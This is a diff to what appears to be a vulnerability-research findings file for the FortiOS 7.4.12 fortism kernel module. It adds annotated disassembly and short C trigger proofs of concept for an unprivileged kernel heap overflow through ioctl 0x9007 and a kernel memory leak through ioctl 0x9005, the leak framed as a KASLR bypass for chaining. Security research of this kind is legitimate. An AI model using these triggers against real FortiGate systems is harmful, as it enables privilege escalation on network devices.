@@ -487,23 +487,34 @@ call kmalloc                 ; allocates ONLY r13d bytes, not rbx+9
 # FortiOS 7.4.12 vmlinux — Ablation BERT sweep hit (BUFFER_OVERFLOW, RACE_CONDITION)
 # vmlinux text_foff=0x552080  vma=0xffffffff80552080
 # ─────────────────────────────────────────────────────────
-FGT_F11_IOCTL_UNVALIDATED_FIELD = {
+FGT_F11_IOCTL_HEAP_OVERFLOW = {
     "id":       "FGT-F11",
     "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
-    "severity": "HIGH",
-    "class":    "Insufficient Input Validation in Proprietary ioctl (kernel privilege escalation surface)",
+    "severity": "CRITICAL",
+    "class":    "Integer Overflow -> Kernel Heap Overflow via fortism LSM file_ioctl hook (LPE)",
 
     "description": (
-        "A fortism kernel module ioctl handler at vma 0xffffffff80552080 implements "
-        "Fortinet-proprietary ioctl commands 0x9002-0x9009. "
-        "For command 0x9004, the handler calls copy_from_user (0x5f6bed) with size=8 (edx=8), "
-        "reading two 32-bit fields from userspace into [rbp-0x68] (word0) and [rbp-0x64] (word1). "
-        "It validates only word0: `cmp dword ptr [rbp-0x68], 0x40; ja error`. "
-        "Word1 at [rbp-0x64] is consumed without any bounds check via "
-        "`movsxd r12, dword ptr [rbp-0x64]` and stored into an internal structure at +0x44. "
-        "For command 0x9009, a similar pattern reads 4 bytes, validates <= 0x40, "
-        "then reads a field from a result structure at +0x30 without re-validating it. "
-        "The ioctl device node and required privilege level to open it have not yet been identified."
+        "The fortism LSM module registers an ioctl hook (vma 0xffffffff80552080) that processes "
+        "Fortinet-proprietary ioctl commands 0x9002-0x9009 on ANY file descriptor system-wide. "
+        "The hook ignores rdi (the struct file* argument), indicating it is the LSM file_ioctl hook "
+        "called by vfs_ioctl() for every ioctl syscall. No capability check is performed. "
+        "\n\n"
+        "ioctl 0x9007 CRITICAL PATH (heap overflow via integer overflow):\n"
+        "  1. copy_from_user(stack, user_ptr, 16) reads a 16-byte user struct: "
+        "{word0[4], word1_length[4], string_user_ptr[8]}.\n"
+        "  2. Validates only word0 <= 0x40.\n"
+        "  3. `lea edi, [word1 + 1]` — 32-bit LEA: if word1=0xffffffff, edi wraps to 0.\n"
+        "  4. `movsxd rdi, edi` sign-extends 0 to 0, then kmalloc(0, GFP_KERNEL) "
+        "returns a valid zero-size SLUB allocation.\n"
+        "  5. `movsxd rdx, word1` sign-extends 0xffffffff to 0xffffffffffffffff (SIZE_MAX).\n"
+        "  6. copy_from_user(heap_buf, string_user_ptr, SIZE_MAX) — "
+        "access_ok(addr, SIZE_MAX) wraps and may pass; copies bytes from mapped user region "
+        "over the zero-size heap allocation and into adjacent SLUB objects.\n"
+        "\n"
+        "ioctl 0x9004 SECONDARY PATH (unchecked field write):\n"
+        "  copy_from_user 8 bytes; validates word0 <= 0x40; word1 stored at structure+0x44 without bounds check.\n"
+        "\n"
+        "Trigger requires only: open(any_fd) + ioctl(fd, 0x9007, attacker_buf)"
     ),
 
     "vmlinux": {
@@ -515,33 +526,54 @@ FGT_F11_IOCTL_UNVALIDATED_FIELD = {
     },
 
     "ioctl_commands": {
-        "0x9002": "reads per-CPU data from gs:[0x14d80], calls 0x30b461 (netlink?)",
-        "0x9003": "jumps to 0x55220e",
-        "0x9004": "copy_from_user 8 bytes; validates word0 <= 0x40; word1 UNCHECKED",
-        "0x9005": "jumps to 0x5521f0",
-        "0x9007": "jumps to 0x55227e",
-        "0x9009": "copy_from_user 4 bytes; validates <= 0x40; reads struct field without revalidation",
+        "0x9002": "reads per-CPU task ptr gs:[0x14d80]; copy_from_user 4 bytes -> calls 0x55aeaf",
+        "0x9003": "copy_from_user 0x24 bytes; validated word0 <= 0x40; reads+writes struct fields",
+        "0x9004": "copy_from_user 8 bytes; validates word0 <= 0x40; word1 stored at struct+0x44 UNCHECKED",
+        "0x9005": "copy_to_user(user_ptr, 0xffffffff81889310, 4) — kernel memory INFO LEAK (see FGT-F15)",
+        "0x9007": "CRITICAL: integer overflow in kmalloc size -> copy_from_user SIZE_MAX -> kernel heap overflow",
+        "0x9009": "copy_from_user 4 bytes; validates <= 0x40; reads struct[+0x30] without revalidation",
     },
 
-    "asm_key_sequence": """
-; ioctl 0x9004 path at 0xffffffff80552080:
-cmp ebx, 0x9004
-jne ...
-mov edx, 8              ; read 8 bytes from userspace
-mov rsi, r12            ; userspace pointer
-lea rdi, [rbp - 0x68]   ; kernel destination (two 32-bit fields)
-call copy_from_user
+    "asm_critical_path_0x9007": """
+; ioctl 0x9007 path at 0xffffffff8055227e:
+mov edx, 0x10                          ; copy 16 bytes from userspace
+mov rsi, r12                           ; userspace pointer (ioctl arg)
+lea rdi, [rbp - 0x68]                  ; stack destination
+call copy_from_user                    ; [rbp-0x68]=word0, [rbp-0x64]=word1, [rbp-0x60]=string_ptr
+
+mov eax, dword ptr [rbp - 0x64]        ; word1 (user-controlled LENGTH)
+lea edi, [rax + 1]                     ; word1+1 — 32-BIT OVERFLOW: 0xffffffff+1 = 0
+movsxd rdi, edi                        ; sign-extend: edi=0 -> rdi=0
+mov esi, 0x6000c0                      ; GFP_KERNEL
+call kmalloc(0, GFP_KERNEL)            ; RETURNS VALID NON-NULL ZERO-SIZE ALLOCATION
+
 test rax, rax
-jne error_path          ; copy_from_user failed
+je error                               ; non-null, continues
 
-mov edi, dword ptr [rbp - 0x68]   ; word0 from userspace
-cmp edi, 0x40                      ; bounds check word0 (must be <= 64)
-ja error_path                      ; word0 validated
+movsxd rdx, dword ptr [rbp - 0x64]    ; rdx = sign_extend(word1) = 0xffffffffffffffff (SIZE_MAX)
+mov rsi, qword ptr [rbp - 0x60]        ; string_user_ptr from userspace
+mov rdi, rax                            ; zero-size heap buffer
+call copy_from_user(heap, user_str, SIZE_MAX)  ; HEAP OVERFLOW: writes past zero-size buf
+                                                ; access_ok(user_str, SIZE_MAX) wraps -> may pass
 
-call 0x5528b8           ; allocate/lookup structure using word0
+; If copy succeeds (partial), null-terminates and calls fortism_set_name:
+movsxd rax, dword ptr [rbp - 0x64]    ; SIZE_MAX
+mov byte ptr [r13 + rax], 0            ; write past massive allocation -> further corruption
+""",
 
-movsxd r12, dword ptr [rbp - 0x64]  ; word1 from userspace — NO BOUNDS CHECK
-mov dword ptr [rax + 0x44], r12d    ; store word1 directly into result structure
+    "trigger_poc": """
+// No root required. Any process, any fd.
+int fd = open("/dev/null", O_RDONLY);
+
+struct {
+    uint32_t word0;        // <= 0x40 (valid ID, e.g. 1)
+    uint32_t word1;        // = 0xffffffff -> overflow to kmalloc(0)
+    uint64_t string_ptr;   // pointer to large mmapped region
+} payload = {1, 0xffffffff, (uint64_t)mmap(...)};
+
+ioctl(fd, 0x9007, &payload);
+// -> kmalloc(0) + copy_from_user(zero_buf, mmap_region, SIZE_MAX)
+// -> heap corruption of adjacent SLUB objects
 """,
 
     "ablation_bert_queries_matched": ["BUFFER_OVERFLOW", "RACE_CONDITION"],
@@ -549,19 +581,78 @@ mov dword ptr [rax + 0x44], r12d    ; store word1 directly into result structure
     "bert_sweep_region": "fortism_init + fos_keyring_enc_key",
 
     "impact": (
-        "An unprivileged user (or Fortinet CLI user with device node access) can write an "
-        "arbitrary signed 32-bit value into an internal fortism structure at offset +0x44 "
-        "without any range validation. Depending on how this field is used (index, size, "
-        "pointer offset), this may enable heap manipulation or privilege escalation."
+        "CRITICAL: Kernel heap overflow via integer overflow in fortism LSM file_ioctl hook. "
+        "Reachable from any unprivileged process via ioctl(any_fd, 0x9007, payload). "
+        "Corrupts adjacent SLUB slab objects -> local kernel privilege escalation. "
+        "No privilege required; no special device node required."
     ),
 
-    "pending": [
-        "Identify device node path (likely /dev/fortism or /dev/fgtguard) and required open() privileges",
-        "Trace how the value stored at structure+0x44 is subsequently used (index into array? length for kmalloc?)",
-        "Test ioctl 0x9004 with word1 = 0x7fffffff (max positive int32)",
+    "caveats": [
+        "access_ok() behavior with SIZE_MAX depends on kernel version and architecture",
+        "SLUB hardening (SLAB_FREELIST_HARDENED, KASAN) may prevent exploitation",
+        "Requires the LSM file_ioctl hook identification to be confirmed (rdi=struct file* ignored)",
+        "Alternate: if NOT the LSM hook but a char device, requires opening /dev/fortism* node",
     ],
 
-    "status": "CANDIDATE — device node access and downstream use of the unchecked field not yet confirmed",
+    "status": "CRITICAL CANDIDATE — integer overflow path confirmed in disassembly; LPE depends on access_ok wrap behavior and SLUB state",
+}
+
+# ─────────────────────────────────────────────────────────
+# FGT-F15: Kernel information leak via fortism ioctl 0x9005
+# FortiOS 7.4.12 vmlinux — fortism ioctl handler at 0x552080 (ioctl 0x9005 branch)
+# ─────────────────────────────────────────────────────────
+FGT_F15_IOCTL_INFOLEAK = {
+    "id":       "FGT-F15",
+    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
+    "severity": "MEDIUM",
+    "class":    "Kernel Information Leak via fortism ioctl 0x9005 (KASLR bypass candidate)",
+
+    "description": (
+        "The fortism ioctl handler (vma 0xffffffff80552080) implements command 0x9005 with: "
+        "`mov rsi, 0xffffffff81889310; mov rdi, r12; call copy_to_user(r12, 0x81889310, 4)`. "
+        "It copies 4 bytes of kernel memory from the hardcoded global address 0xffffffff81889310 "
+        "directly to the user-supplied pointer (r12 = ioctl arg) without any privilege check. "
+        "The 4 bytes at 0x81889310 are a Fortinet-internal state value (type or count field), "
+        "but more importantly the operation confirms that the fortism ioctl hook executes "
+        "kernel-to-user memory copies for any caller. "
+        "If the 4-byte value contains or is influenced by randomized kernel addresses, "
+        "this is a KASLR bypass. Even if not, it leaks internal fortism state to any user process."
+    ),
+
+    "vmlinux": {
+        "vma_ioctl_handler": "0xffffffff80552080",
+        "vma_0x9005_branch": "0xffffffff805521f0",
+        "kernel_src_addr":   "0xffffffff81889310",
+        "kernel_src_foff":   "0x1489310 (in .data section)",
+        "copy_size":         "4 bytes",
+    },
+
+    "asm": """
+; ioctl 0x9005 path at 0xffffffff805521f0:
+mov edx, 4
+mov rsi, 0xffffffff81889310   ; kernel .data global (hardcoded)
+mov rdi, r12                   ; r12 = ioctl arg = user destination pointer
+call copy_to_user              ; 0x5f6bbd: leaks 4 bytes to userspace
+test rax, rax
+jne error                      ; -EFAULT if user ptr invalid
+xor r12d, r12d                 ; return 0 on success
+""",
+
+    "trigger": """
+// Any process, no root required.
+uint32_t leaked_val;
+ioctl(any_fd, 0x9005, &leaked_val);
+// leaked_val contains 4 bytes from kernel 0xffffffff81889310
+""",
+
+    "impact": (
+        "Leaks 4 bytes from kernel .data to any unprivileged user process. "
+        "If the value at 0x81889310 is address-derived or contains pointer fragments, "
+        "enables KASLR bypass -> defeats kernel ASLR protection, enabling follow-on exploitation "
+        "of FGT-F11 or other kernel memory corruption primitives."
+    ),
+
+    "status": "CONFIRMED — copy_to_user with hardcoded kernel address, no privilege check; what's at 0x81889310 needs dynamic analysis to determine if it leaks pointer material",
 }
 
 # ─────────────────────────────────────────────────────────
